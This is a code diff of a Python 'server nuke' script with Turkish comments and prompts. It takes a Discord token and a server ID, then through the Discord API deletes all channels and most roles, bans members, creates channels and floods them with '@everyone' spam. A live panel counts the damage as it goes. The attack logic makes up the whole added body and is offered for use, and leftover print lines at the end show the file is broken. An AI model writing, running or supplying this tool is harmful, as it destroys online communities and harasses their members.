@@ -1,39 +1,99 @@
 import requests
-import json
-import os
-import sys
-import threading
 import time
+import os
+import threading
 from colorama import Fore, init
-
-# Kütüphane Kontrolü
-try:
-    import websocket
-except ImportError:
-    os.system("pip install websocket-client requests colorama")
-    import websocket
 
 init(autoreset=True)
 
-# Global Değişkenler
-TOKEN = ""
-TARGET_GUILD_ID = ""
-HEADERS = {}
-START_TIME = time.time()
-
 # İstatistikler
-stats = {"silinen_kanal": 0, "silinen_rol": 0, "banlanan_uye": 0}
+stats = {"silinen_kanal": 0, "silinen_rol": 0, "banlanan_uye": 0, "start_time": time.time()}
 
-def clear_screen():
+def clear():
     os.system('clear' if os.name == 'posix' else 'cls')
 
 def draw_panel():
-    uptime = int(time.time() - START_TIME)
-    clear_screen()
+    uptime = int(time.time() - stats["start_time"])
+    clear()
     print(Fore.CYAN + "=============================================")
     print(Fore.MAGENTA + "      👑 EMPIRE ADVANCED AUTO-SYSTEM 👑      ")
     print(Fore.CYAN + "=============================================")
     print(Fore.YELLOW + f"[*] Çalışma Süresi : {uptime} saniye")
+    print(Fore.GREEN + f"[*] Silinen Kanal  : {stats['silinen_kanal']}")
+    print(Fore.GREEN + f"[*] Silinen Rol    : {stats['silinen_rol']}")
+    print(Fore.GREEN + f"[*] Banlanan Üye   : {stats['banlanan_uye']}")
+    print(Fore.CYAN + "=============================================\n")
+
+def validate_token(token):
+    headers = {'Authorization': token}
+    res = requests.get('https://discord.com/api/v9/users/@me', headers=headers)
+    return res.status_code == 200
+
+def nuke_process(token, guild_id, k_sure, r_sure, u_sure, k_adet, k_isim, mesaj, mesaj_adet):
+    headers = {'Authorization': token, 'Content-Type': 'application/json'}
+    
+    # 1. Kanalları Sil
+    channels = requests.get(f'https://discord.com/api/v9/guilds/{guild_id}/channels', headers=headers)
+    if channels.status_code == 200:
+        for ch in channels.json():
+            requests.delete(f'https://discord.com/api/v9/channels/{ch["id"]}', headers=headers)
+            stats["silinen_kanal"] += 1
+            draw_panel()
+            time.sleep(k_sure)
+    
+    # 2. Rolleri Sil
+    roles = requests.get(f'https://discord.com/api/v9/guilds/{guild_id}/roles', headers=headers)
+    if roles.status_code == 200:
+        for role in roles.json():
+            if role["name"] != "@everyone" and not role.get("managed"):
+                requests.delete(f'https://discord.com/api/v9/guilds/{guild_id}/roles/{role["id"]}', headers=headers)
+                stats["silinen_rol"] += 1
+                draw_panel()
+                time.sleep(r_sure)
+                
+    # 3. Üyeleri Banla
+    members = requests.get(f'https://discord.com/api/v9/guilds/{guild_id}/members?limit=1000', headers=headers)
+    if members.status_code == 200:
+        for m in members.json():
+            requests.put(f'https://discord.com/api/v9/guilds/{guild_id}/bans/{m["user"]["id"]}', headers=headers)
+            stats["banlanan_uye"] += 1
+            draw_panel()
+            time.sleep(u_sure)
+
+    # 4. Kanal Aç ve Mesaj Yaz
+    for _ in range(k_adet):
+        res = requests.post(f'https://discord.com/api/v9/guilds/{guild_id}/channels', headers=headers, json={"name": k_isim, "type": 0})
+        if res.status_code == 201:
+            ch_id = res.json()["id"]
+            # Mesaj atma döngüsü
+            for _ in range(mesaj_adet):
+                requests.post(f'https://discord.com/api/v9/channels/{ch_id}/messages', headers=headers, json={"content": mesaj})
+                time.sleep(0.5)
+
+# --- ANA PROGRAM ---
+if __name__ == "__main__":
+    clear()
+    while True:
+        token = input(Fore.YELLOW + "Token giriniz: ")
+        if validate_token(token):
+            print(Fore.GREEN + "Token geçerli, giriş yapıldı!")
+            break
+        print(Fore.RED + "Geçersiz Token!")
+    
+    gid = input("Sunucu ID: ")
+    ks = float(input("Kanal silme hızı (0.5): "))
+    rs = float(input("Rol silme hızı (0.5): "))
+    us = float(input("Üye ban hızı (0.5): "))
+    ka = int(input("Kaç kanal açılsın?: "))
+    ki = input("Kanal ismi: ")
+    msj = "@everyone " + input("Kanallara ne yazsın?: ")
+    m_adet = int(input("Her kanala kaç kez yazılsın?: "))
+    
+    threading.Thread(target=nuke_process, args=(token, gid, ks, rs, us, ka, ki, msj, m_adet), daemon=True).start()
+    
+    while True:
+        draw_panel()
+        time.sleep(2)
     print(Fore.GREEN + f"[*] Silinen Kanal  : {stats['silinen_kanal']}")
     print(Fore.GREEN + f"[*] Silinen Rol    : {stats['silinen_rol']}")
     print(Fore.GREEN + f"[*] Banlanan Üye   : {stats['banlanan_uye']}")
